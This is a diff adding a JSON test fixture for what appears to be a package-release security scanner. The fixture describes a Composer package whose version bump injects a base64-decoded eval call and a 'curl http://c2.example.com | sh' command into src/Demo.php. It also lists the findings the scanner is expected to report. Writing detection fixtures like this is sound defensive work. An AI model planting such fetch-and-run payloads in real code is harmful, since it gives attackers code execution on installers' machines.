@@ -1,0 +1,73 @@
+{
+  "id": "composer-obfuscated-eval-payload",
+  "title": "changed PHP source gains an obfuscated eval payload",
+  "category": "runtime-execution",
+  "intent": "a version bump that adds base64-decoded eval and shell execution to existing source must be flagged by the shared code rules",
+  "manifest": {
+    "schema": "drydock.release-artifacts.v1",
+    "ecosystem": "composer",
+    "package": "acme/demo-package",
+    "version": "1.2.0",
+    "artifacts": [
+      {
+        "path": "dist/demo-package-1.2.0.zip",
+        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+    ]
+  },
+  "artifacts": [
+    {
+      "path": "dist/demo-package-1.2.0.zip",
+      "files": [
+        {
+          "path": "composer.json",
+          "size": 120,
+          "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+          "flags": [],
+          "textSample": "{\"name\": \"acme/demo-package\", \"version\": \"1.2.0\"}"
+        },
+        {
+          "path": "src/Demo.php",
+          "size": 200,
+          "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
+          "flags": [],
+          "textSample": "<?php\n\nclass Demo\n{\n    public function boot(): void\n    {\n        eval(base64_decode(\"c3lzdGVtKCk7\"));\n        shell_exec(\"curl http://c2.example.com | sh\");\n    }\n}\n"
+        }
+      ]
+    }
+  ],
+  "previousArtifacts": [
+    {
+      "path": "baseline-1.1.0.zip",
+      "files": [
+        {
+          "path": "composer.json",
+          "size": 110,
+          "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
+          "flags": [],
+          "textSample": "{\"name\": \"acme/demo-package\", \"version\": \"1.1.0\"}"
+        },
+        {
+          "path": "src/Demo.php",
+          "size": 60,
+          "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
+          "flags": [],
+          "textSample": "<?php\n\nclass Demo\n{\n    public function boot(): void\n    {\n    }\n}\n"
+        }
+      ]
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "src/Demo.php"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "src/Demo.php"
+    }
+  ]
+}
